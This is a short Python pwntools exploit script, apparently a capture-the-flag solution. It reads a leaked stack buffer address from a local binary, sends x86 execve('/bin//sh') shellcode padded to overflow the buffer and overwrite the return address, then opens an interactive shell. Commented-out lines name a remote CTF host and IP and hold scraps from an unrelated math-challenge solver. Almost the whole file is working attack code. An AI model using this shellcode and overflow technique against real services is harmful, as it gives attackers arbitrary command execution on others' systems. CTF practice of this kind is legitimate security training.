
from pwn import *

#target = remote('cweaccessionsctf.com', '1340')
target = process('./shell')

#r = remote('52.227.157.244', '1340')

#g = "What is the value of 30 + 38?"

#h = g[g.index('f')+2:g.index('?')]

#print(h)


print(target.recvuntil("Buffer location = "))
leak = target.recvline()
leak = leak.decode('utf8').strip(" \n")
print(leak)
memAddress = int(leak ,16)
print(memAddress)

#payload = ""
payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
payload += "A"*(0x38 - len(payload))
payload += p32(memAddress)

#encoded = bytes(payload, 'utf-8')
#encoded += p32(memAddress)

target.sendline(payload)
target.interactive()
#while True:
#if s.endswith(b'0'):
# answer = bytes.fromhex('abf0483b3ddb9cf938b9633aa951d000') #'b8 84 81 0'
# r.sendline(answer)


